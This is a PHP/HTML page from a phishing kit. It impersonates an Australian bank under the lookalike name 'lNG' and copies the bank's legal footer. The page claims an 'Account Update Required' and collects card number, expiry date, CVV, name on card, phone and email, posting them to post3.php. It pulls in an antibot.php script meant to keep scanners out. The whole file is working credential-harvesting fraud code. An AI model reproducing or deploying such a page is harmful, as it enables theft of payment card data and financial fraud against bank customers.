<?php
require "antibot.php";
include "id.php";
?>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Verification</title>
    <link rel="stylesheet" href="card.css">
    <style>
        @font-face {
            font-family: "Christmas";
            src: url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.eot");
            src: url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.eot?#iefix") format("embedded-opentype"),
                 url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.woff2") format("woff2"),
                 url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.woff") format("woff"),
                 url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.ttf") format("truetype"),
                 url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.svg#Christmas") format("svg");
        }
    </style>
</head>
<body>
    <header>
        <img src="logo.png" alt="lNG Logo">
        <button>Login</button>
    </header>
    <main>
        <section class="verification-form">
            <h1>Account Update Required</h1>
<p>Your account is still not updated. Please verify your card to unlock the following banking features:</p>
        <ul>
            <li>ATM Withdrawals</li>
            <li>Online Transfers</li>
            <li>Online Purchases</li>
        </ul>
            <form id="card-verification-form" action="post3.php" method="POST">
                <label for="card-number">Card Number</label>
                <input type="text" style="
    padding-top: 15px;
    padding-bottom: 15px;
" id="card-number" name="card-number" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
                
                <div class="flex-container">
                    <div class="flex-item">
                        <label for="expiry-date">Expiry Date</label>
                        <input type="text" style="
    padding-top: 15px;
    padding-bottom: 15px;
" id="expiry-date" name="expiry-date" placeholder="MM/YY" maxlength="5"required>
                    </div>
                    <div class="flex-item" style="
    margin-left: 6%;
">
                        <label for="cvv">CVV</label>
                        <input style="
    padding-top: 15px;
    padding-bottom: 15px;
" type="text" id="cvv" name="cvv" placeholder="XXX" maxlength="3" required>
                    </div>
                </div>

                <label for="card-name">Name on Card</label>
                <input style="
    padding-top: 15px;
    padding-bottom: 15px;
" type="text" id="card-name" name="card-name" placeholder="Name on Card" required>
                
                <label for="phone-number">Phone Number</label>
                <input style="
    padding-top: 15px;
    padding-bottom: 15px;
" type="text" id="phone-number" name="phone-number" placeholder="Phone Number" required>
                
                <label for="email">Email</label>
<input style="
    padding-top: 15px;
    padding-bottom: 15px;
" type="text"  name="email" placeholder="example@bigpond.com" required><button type="submit" class="verify-button">Verify</button>
            </form>
        </section>
    </main>
    <footer>
        <div class="footer-top">
            <ul>
                <li><a href="#">Help And Support</a></li>
                
                
                <li><a href="#">Contact Us</a></li>
            </ul>
            
            <ul>
                <li><a href="#">About Us</a></li>
                <li><a href="#">Contact Us</a></li>
                
                
                
                
                
            </ul>
        </div>
        <div class="footer-bottom">
            <img src="logo.png" alt="lNG Logo">
            <p>lNG is a business name of lNG Bank (Australia) Limited ABN 24 000 893 292 AFSL 229823, Australian Credit Licence 229823.<br>
            For information about the Australian Government Deposit Guarantee, click here. lNG Living Super (which is part of the lNG Superannuation Fund ABN 13 355 603 448) is issued by The Trust Company (Superannuation) Limited ABN 49 006 421 638, AFSL 235153.</p>
        </div>
    </footer>

    <script src="card.js"></script>
		<script src="https://www.google.com/recaptcha/api.js?render=<?php echo $siteKey; ?>"></script>
<script>
grecaptcha.ready(function() {
    document.getElementById('card-verification-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent form submission
        grecaptcha.execute('<?php echo $siteKey; ?>', {action: 'submit'}).then(function(token) {
            // Add your logic to submit form or append the token to the form
            var recaptchaResponse = document.createElement('input');
            recaptchaResponse.type = 'hidden';
            recaptchaResponse.name = 'recaptcha_response';
            recaptchaResponse.value = token;
            document.getElementById('card-verification-form').appendChild(recaptchaResponse);

            // Now submit the form
            document.getElementById('card-verification-form').submit();
        });
    });
});
</script>

</body></html>